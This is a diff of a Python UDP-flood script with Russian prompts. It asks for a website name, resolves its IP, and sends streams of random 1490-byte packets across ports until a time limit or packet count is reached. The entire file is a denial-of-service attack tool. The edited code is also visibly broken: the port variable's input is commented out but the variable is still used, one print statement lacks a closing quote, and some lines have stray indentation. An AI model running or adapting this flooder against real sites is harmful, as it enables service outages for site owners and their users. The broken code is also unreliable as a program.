@@ -7,16 +7,15 @@ import random
 os.system("clear")
 
 from datetime import datetime
-now = datetime.now()
-hour = now.hour
-minute = now.minute
-day = now.day
-month = now.month
-year = now.year
+#now = datetime.now()
+#hour = now.hour
+#minute = now.minute
+#day = now.day
+#month = now.month
+#year = now.year
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
-
 
 limit = 0
 app = 0
@@ -36,48 +35,54 @@ print()
             # if app == 1:
 print
 site = input('Имя сайта: ')
-ip = socket.gethostbyname(site) 
+ip = socket.gethostbyname(site)
+print ('searching...')
 time.sleep(2)
 print ('Site IP: ',ip)
 print()
 print('##########################################')
 print()
+                        #print
+                        #port = int(input('port: '))
+                        #print()
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+print('Time now: %s:%s'%(hour,minute))
 print
-port = int(input('port: '))
-print()
-print('TIME: %s:%s'%(hour,minute))
+limit = int(input('Time attack limit(minute): '))
 stopminute = 0
-print
-limit = int(input('attack limit(minute): '))
 stopminute = minute + limit
-print('End site attack in: %s:%s'%(hour,stopminute))
+print('Stop site attack in: %s:%s'%(hour,stopminute))
+print('Maximum: 1 000 000 packs)
+print()
+      gonext = input('Изминить максимальное кол-во пакетов(Да/Нет): '))
+      if gonext[1] == 'Д':
+                        print
+                        maxpack = int(input('Сколько пакетов отправить: '))
+                        mil = maxpack
+      else:
+           mil = 1000000
+print()
 print('##########################################')
 
-#nowhour = 0
-#nowminute = 0
-
-##nowhour = now.hour*1
-##nowminute = now.minute*1
-##print('time %s:%s'%(nowhour,nowminute))
-##print "sent packet: s% to %s on port:%s"%(sent,ip,port)
-
 sent = 0
-mil = 1000000
+
 while True:
             now = datetime.now()
             nowminute = now.minute
-            print(nowminute)
             print('Stop attack in %s:%s'%(hour,stopminute))
             sock.sendto(bytes, (ip,port))
             sent = sent + 1
             port = port + 1
             stopattack = mil - sent 
-            print('pack %s remained %s'%(sent,stopattack))
+            print('     [pack %s] remained %s'%(sent,stopattack))
             
             if port == 65534:
                         port = 1
                         
             if nowminute == stopminute:
                         sys.exit()
-                        if sent == mil:
-                                    break
+                        
+            if sent == mil:
+                        break
